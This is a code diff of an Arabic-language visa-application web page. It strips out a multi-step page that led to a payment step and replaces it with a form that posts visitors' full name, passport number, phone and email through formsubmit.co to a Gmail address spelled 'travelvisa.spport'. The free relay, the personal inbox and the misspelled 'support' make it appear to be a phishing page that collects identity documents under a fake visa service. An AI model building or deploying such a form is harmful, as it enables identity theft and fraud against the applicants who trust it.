@@ -1,70 +1,24 @@
-<!DOCTYPE html>
-<html lang="ar">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>المعلومات الشخصية</title>
-<link rel="stylesheet" href="style.css">
-</head>
+<form action="https://formsubmit.co/travelvisa.spport@gmail.com" method="POST">
 
-<body>
+  <div class="card">
 
-<div class="header">👤 بيانات الطلب</div>
+    <h2>👤 بيانات الطلب</h2>
 
-<div class="container">
+    <input name="name" placeholder="الاسم الكامل" required>
+    <input name="lastname" placeholder="اللقب" required>
+    <input name="passport" placeholder="رقم جواز السفر" required>
+    <input name="phone" placeholder="رقم الهاتف" required>
+    <input name="email" placeholder="البريد الإلكتروني" required>
 
-<div class="card">
+    <select name="reason" required>
+      <option value="">سبب السفر</option>
+      <option>سياحة</option>
+      <option>عمل</option>
+      <option>إقامة</option>
+    </select>
 
-<h2>📄 معلومات شخصية</h2>
+    <button type="submit">إرسال الطلب</button>
 
-<input id="name" placeholder="الاسم الكامل">
-<input id="lastname" placeholder="اللقب">
-<input id="birth" type="date" placeholder="تاريخ الميلاد">
+  </div>
 
-<h3>🛂 معلومات الجواز</h3>
-
-<input id="passport" placeholder="رقم جواز السفر">
-<input id="expiry" type="date" placeholder="تاريخ الانتهاء">
-
-<h3>📞 معلومات التواصل</h3>
-
-<input id="phone" placeholder="رقم الهاتف">
-<input id="email" placeholder="البريد الإلكتروني">
-
-<h3>🌍 سبب السفر</h3>
-
-<select id="reason">
-<option value="">اختر السبب</option>
-<option>سياحة</option>
-<option>عمل</option>
-<option>إقامة</option>
-</select>
-
-<button onclick="next()">التالي إلى الدفع</button>
-
-</div>
-
-</div>
-
-<script>
-function next(){
-
-let fields = [
-"name","lastname","birth",
-"passport","expiry",
-"phone","email","reason"
-];
-
-for(let f of fields){
-if(document.getElementById(f).value==""){
-alert("يرجى ملء جميع الحقول");
-return;
-}
-}
-
-location.href="step4.html";
-}
-</script>
-
-</body>
-</html>
+</form>
